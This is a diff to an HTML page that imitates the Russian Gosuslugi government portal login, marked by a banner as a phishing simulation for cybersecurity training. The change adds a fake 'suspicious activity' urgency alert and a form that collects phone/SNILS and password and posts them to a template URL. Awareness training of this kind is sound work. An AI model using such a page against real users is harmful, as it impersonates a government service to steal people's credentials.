@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Портал государственных услуг</title>
+    <title>Портал Госуслуги - Вход в личный кабинет</title>
     <style>
         * {
             margin: 0;
@@ -14,21 +14,22 @@
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
             min-height: 100vh;
-            color: #333;
+            display: flex;
+            flex-direction: column;
         }
         .training-banner {
             background: linear-gradient(135deg, #0d47a1 0%, #1565c0 100%);
             color: white;
-            padding: 10px;
+            padding: 8px 12px;
             text-align: center;
             font-weight: bold;
-            font-size: 12px;
+            font-size: 11px;
             box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
         .header {
             background: #0d47a1;
             color: white;
-            padding: 15px 30px;
+            padding: 12px 25px;
             display: flex;
             align-items: center;
             justify-content: space-between;
@@ -37,20 +38,20 @@
         .logo {
             display: flex;
             align-items: center;
-            font-size: 20px;
+            font-size: 18px;
             font-weight: bold;
         }
         .logo-icon {
-            width: 36px;
-            height: 36px;
+            width: 32px;
+            height: 32px;
             background: white;
             border-radius: 8px;
-            margin-right: 12px;
+            margin-right: 10px;
             display: flex;
             align-items: center;
             justify-content: center;
             color: #0d47a1;
-            font-size: 20px;
+            font-size: 18px;
             font-weight: bold;
         }
         .header-links {
@@ -69,238 +70,366 @@
         }
         .main-container {
             flex: 1;
-            padding: 40px 20px;
-            max-width: 1200px;
-            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow-y: auto;
         }
-        .hero {
+        .login-container {
             background: white;
-            border-radius: 12px;
-            padding: 50px;
-            text-align: center;
-            margin-bottom: 40px;
+            padding: 30px;
+            border-radius: 10px;
             box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 420px;
             border: 1px solid #e0e0e0;
         }
-        .hero h1 {
-            color: #0d47a1;
-            font-size: 36px;
+        .security-alert {
+            background: #fff8e1;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
             margin-bottom: 20px;
+            border-radius: 6px;
         }
-        .hero p {
-            color: #666;
-            font-size: 18px;
-            max-width: 800px;
-            margin: 0 auto 30px;
-            line-height: 1.6;
+        .security-alert-title {
+            color: #856404;
+            font-weight: bold;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            font-size: 14px;
         }
-        .login-box {
-            background: #e8f4fd;
-            border: 2px solid #0d47a1;
-            border-radius: 10px;
-            padding: 30px;
-            max-width: 400px;
-            margin: 30px auto;
+        .security-alert-text {
+            color: #856404;
+            font-size: 12px;
+            line-height: 1.5;
+        }
+        .login-title {
+            color: #0d47a1;
+            font-size: 24px;
+            margin-bottom: 8px;
+            font-weight: 600;
             text-align: center;
         }
-        .login-button {
-            display: inline-block;
-            background: #0d47a1;
-            color: white;
-            text-decoration: none;
-            padding: 16px 40px;
-            border-radius: 8px;
-            font-size: 18px;
-            font-weight: bold;
-            margin-top: 20px;
+        .login-subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #455a64;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 15px;
+            transition: all 0.3s;
+            background: #fafafa;
+        }
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #0d47a1;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(13, 71, 161, 0.1);
+        }
+        .password-wrapper {
+            position: relative;
+        }
+        .password-toggle {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+            padding: 6px 10px;
+            color: #546e7a;
+            user-select: none;
+            font-weight: 500;
+            border-radius: 4px;
             transition: all 0.3s;
         }
+        .password-toggle:hover {
+            color: #0d47a1;
+            background: #f5f5f5;
+        }
+        input[type="password"],
+        input[type="text"].password-input {
+            padding-right: 50px;
+        }
+        .remember-me {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #546e7a;
+        }
+        .remember-me input {
+            margin-right: 10px;
+            width: 18px;
+            height: 18px;
+            accent-color: #0d47a1;
+        }
+        .login-button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #0d47a1 0%, #1565c0 100%);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 12px rgba(13, 71, 161, 0.3);
+        }
         .login-button:hover {
-            background: #1565c0;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(13, 71, 161, 0.3);
+            background: linear-gradient(135deg, #1565c0 0%, #0d47a1 100%);
+            box-shadow: 0 6px 18px rgba(13, 71, 161, 0.4);
+            transform: translateY(-1px);
         }
-        .services {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 25px;
-            margin: 50px 0;
+        .login-button:active {
+            transform: translateY(0);
         }
-        .service-card {
-            background: white;
-            border-radius: 10px;
-            padding: 25px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
-            border: 1px solid #e0e0e0;
-            transition: transform 0.3s;
+        .security-info {
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            text-align: center;
         }
-        .service-card:hover {
-            transform: translateY(-5px);
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            color: #2e7d32;
+            font-size: 12px;
+            font-weight: 500;
+            background: #f1f8e9;
+            padding: 10px 16px;
+            border-radius: 20px;
         }
-        .service-icon {
-            font-size: 32px;
-            margin-bottom: 15px;
+        .footer-links {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .footer-links a {
             color: #0d47a1;
+            text-decoration: none;
+            margin: 0 12px;
+            transition: color 0.3s;
         }
-        .service-title {
-            color: #0d47a1;
-            font-size: 18px;
-            margin-bottom: 10px;
+        .footer-links a:hover {
+            color: #1565c0;
+            text-decoration: underline;
         }
         .footer {
             background: #f8f9fa;
-            padding: 30px;
+            padding: 20px;
             text-align: center;
             color: #666;
             font-size: 12px;
-            border-top: 3px solid #0d47a1;
-            margin-top: 60px;
+            border-top: 2px solid #e0e0e0;
         }
-        .footer-links {
-            margin: 20px 0;
+        .footer p {
+            margin: 5px 0;
         }
-        .footer-links a {
+        .footer a {
             color: #666;
             text-decoration: none;
-            margin: 0 15px;
-            font-size: 12px;
+            margin: 0 10px;
+            transition: color 0.3s;
         }
-        @media (max-width: 768px) {
+        .footer a:hover {
+            color: #0d47a1;
+        }
+        
+        @media (max-height: 750px) {
+            .training-banner {
+                padding: 6px 10px;
+                font-size: 10px;
+            }
             .header {
-                flex-direction: column;
-                gap: 15px;
+                padding: 10px 20px;
+            }
+            .login-container {
+                padding: 25px;
+            }
+            .security-alert {
+                padding: 12px;
+                margin-bottom: 15px;
+            }
+            .login-title {
+                font-size: 22px;
+                margin-bottom: 6px;
+            }
+            .login-subtitle {
+                margin-bottom: 20px;
+            }
+            .form-group {
+                margin-bottom: 18px;
+            }
+            input[type="text"],
+            input[type="password"] {
+                padding: 12px 14px;
+            }
+            .footer {
                 padding: 15px;
             }
+        }
+        
+        @media (max-width: 500px) {
             .header-links {
-                display: flex;
-                flex-wrap: wrap;
-                justify-content: center;
-                gap: 15px;
+                display: none;
             }
-            .header-links a {
-                margin: 0;
+            .login-container {
+                padding: 25px 20px;
+                margin: 10px;
             }
-            .hero {
-                padding: 30px 20px;
-            }
-            .hero h1 {
-                font-size: 28px;
+            .footer-links a {
+                display: block;
+                margin: 8px 0;
             }
         }
-        .training-notice {
-            background: #fff3cd;
-            border: 3px solid #ffc107;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 20px 0;
-            text-align: center;
-            font-size: 13px;
-            color: #856404;
-            font-weight: bold;
+        
+        .input-hint {
+            font-size: 12px;
+            color: #78909c;
+            margin-top: 4px;
+            font-style: italic;
         }
     </style>
 </head>
 <body>
     <div class="training-banner">
-        ⚠️ УЧЕБНЫЙ ТРЕНИНГ ПО КИБЕРБЕЗОПАСНОСТИ - Имитационный портал для обучения
+        ⚠️ УЧЕБНЫЙ ТРЕНИНГ ПО КИБЕРБЕЗОПАСНОСТИ - Это имитационная фишинговая страница для образовательных целей ⚠️
     </div>
     
     <div class="header">
         <div class="logo">
             <div class="logo-icon">🇷🇺</div>
-            Госуслуги
+            Портал Госуслуги
         </div>
         <div class="header-links">
             <a href="#">Услуги</a>
-            <a href="#">Запись на прием</a>
+            <a href="#">Запись</a>
             <a href="#">Помощь</a>
-            <a href="login.html">Личный кабинет</a>
         </div>
     </div>
     
     <div class="main-container">
-        <div class="training-notice">
-            🎓 Это имитационная страница для обучения распознаванию фишинга
-        </div>
-        
-        <div class="hero">
-            <h1>Государственные услуги онлайн</h1>
-            <p>Получайте государственные и муниципальные услуги в электронной форме быстро, просто, без очередей и в любое удобное время</p>
-            
-            <div class="login-box">
-                <h2 style="color: #0d47a1; margin-bottom: 15px;">Вход в личный кабинет</h2>
-                <p style="color: #666; margin-bottom: 20px;">Для доступа ко всем электронным услугам требуется авторизация</p>
-                <a href="login.html" class="login-button">Войти в личный кабинет</a>
-                <p style="margin-top: 15px; font-size: 14px; color: #666;">
-                    Нет учетной записи? <a href="#" style="color: #0d47a1;">Зарегистрируйтесь</a>
-                </p>
-            </div>
-        </div>
-        
-        <h2 style="color: #0d47a1; text-align: center; margin: 50px 0 30px 0;">Популярные услуги</h2>
-        
-        <div class="services">
-            <div class="service-card">
-                <div class="service-icon">📋</div>
-                <h3 class="service-title">Паспорта и регистрация</h3>
-                <p style="color: #666; font-size: 14px; line-height: 1.6;">
-                    Замена паспорта, регистрация по месту жительства, получение загранпаспорта
-                </p>
+        <div class="login-container">
+            <div class="security-alert">
+                <div class="security-alert-title">
+                    🔒 Требуется проверка безопасности
+                </div>
+                <div class="security-alert-text">
+                    Обнаружена подозрительная активность в вашем личном кабинете. Подтвердите личность, чтобы предотвратить блокировку доступа.
+                </div>
             </div>
             
-            <div class="service-card">
-                <div class="service-icon">🚗</div>
-                <h3 class="service-title">Транспорт и вождение</h3>
-                <p style="color: #666; font-size: 14px; line-height: 1.6;">
-                    Запись на экзамен в ГИБДД, регистрация транспортных средств, оплата штрафов
-                </p>
-            </div>
+            <h1 class="login-title">Вход в личный кабинет</h1>
+            <p class="login-subtitle">Введите данные для подтверждения вашей учетной записи</p>
             
-            <div class="service-card">
-                <div class="service-icon">🏥</div>
-                <h3 class="service-title">Здоровье и медицина</h3>
-                <p style="color: #666; font-size: 14px; line-height: 1.6;">
-                    Запись к врачу, получение полиса ОМС, справки и выписки
-                </p>
-            </div>
-            
-            <div class="service-card">
-                <div class="service-icon">🏠</div>
-                <h3 class="service-title">Недвижимость</h3>
-                <p style="color: #666; font-size: 14px; line-height: 1.6;">
-                    Регистрация прав собственности, выписки из ЕГРН, техническая инвентаризация
-                </p>
-            </div>
-            
-            <div class="service-card">
-                <div class="service-icon">👶</div>
-                <h3 class="service-title">Семья и дети</h3>
-                <p style="color: #666; font-size: 14px; line-height: 1.6;">
-                    Запись в детский сад и школу, получение пособий, сертификат на материнский капитал
-                </p>
-            </div>
-            
-            <div class="service-card">
-                <div class="service-icon">💼</div>
-                <h3 class="service-title">Работа и бизнес</h3>
-                <p style="color: #666; font-size: 14px; line-height: 1.6;">
-                    Регистрация юридических лиц и ИП, лицензирование, отчетность в контролирующие органы
-                </p>
-            </div>
+            <form action="{{.URL}}" method="POST">
+                <div class="form-group">
+                    <label for="username">Номер телефона или СНИЛС</label>
+                    <input type="text" id="username" name="username" placeholder="Введите номер телефона или СНИЛС" required autofocus>
+                    <div class="input-hint">Используйте номер телефона или СНИЛС, указанный при регистрации</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Пароль</label>
+                    <div class="password-wrapper">
+                        <input type="password" id="password" name="password" placeholder="Введите пароль" required>
+                        <button type="button" class="password-toggle" onclick="togglePassword()" aria-label="Показать/скрыть пароль">
+                            <span id="toggleIcon">Показать</span>
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="remember-me">
+                    <input type="checkbox" id="remember">
+                    <label for="remember">Запомнить это устройство</label>
+                </div>
+                
+                <button type="submit" class="login-button">Подтвердить личность и войти</button>
+                
+                <div class="security-info">
+                    <div class="security-badge">
+                        🔐 Защищенное соединение • ГОСТ 28147-89
+                    </div>
+                </div>
+                
+                <div class="footer-links">
+                    <a href="#">Забыли пароль?</a>
+                    <a href="#">Регистрация</a>
+                    <a href="#">Войти через ЕСИА</a>
+                </div>
+            </form>
         </div>
     </div>
     
     <div class="footer">
-        <p>© 2024 Министерство цифрового развития, связи и массовых коммуникаций Российской Федерации</p>
-        <div class="footer-links">
-            <a href="#">Политика конфиденциальности</a> • 
-            <a href="#">Обработка персональных данных</a> • 
-            <a href="#">Пользовательское соглашение</a> • 
-            <a href="#">Техническая поддержка</a>
-        </div>
-        <p style="margin-top: 20px; font-size: 11px; color: #999;">
-            Имитационный портал для обучения кибербезопасности. Не является официальным сайтом.
+        <p>© 2025 Министерство цифрового развития, связи и массовых коммуникаций Российской Федерации</p>
+        <p>
+            <a href="#">Политика конфиденциальности</a> |
+            <a href="#">Обработка персональных данных</a> |
+            <a href="#">Пользовательское соглашение</a>
         </p>
     </div>
+    
+    <script>
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const toggleIcon = document.getElementById('toggleIcon');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleIcon.textContent = 'Скрыть';
+            } else {
+                passwordInput.type = 'password';
+                toggleIcon.textContent = 'Показать';
+            }
+        }
+        
+        // Дополнительный функционал: маска для ввода телефона/СНИЛС
+        document.getElementById('username').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            
+            if (value.length === 11 && (value.startsWith('7') || value.startsWith('8'))) {
+                // Формат телефона
+                let formatted = '+7 (' + value.substring(1, 4) + ') ' + value.substring(4, 7) + '-' + value.substring(7, 9) + '-' + value.substring(9, 11);
+                e.target.value = formatted;
+            } else if (value.length === 11) {
+                // Формат СНИЛС
+                let formatted = value.substring(0, 3) + '-' + value.substring(3, 6) + '-' + value.substring(6, 9) + ' ' + value.substring(9, 11);
+                e.target.value = formatted;
+            }
+        });
+        
+        // Симуляция отправки формы (для учебных целей)
+        document.querySelector('form').addEventListener('submit', function(e) {
+            // В учебных целях можно показать сообщение
+            // В реальном фишинге форма бы отправлялась на сервер
+            console.log('Форма отправлена (учебный пример)');
+            // e.preventDefault(); // Раскомментировать для тестирования
+        });
+    </script>
 </body>
 </html>
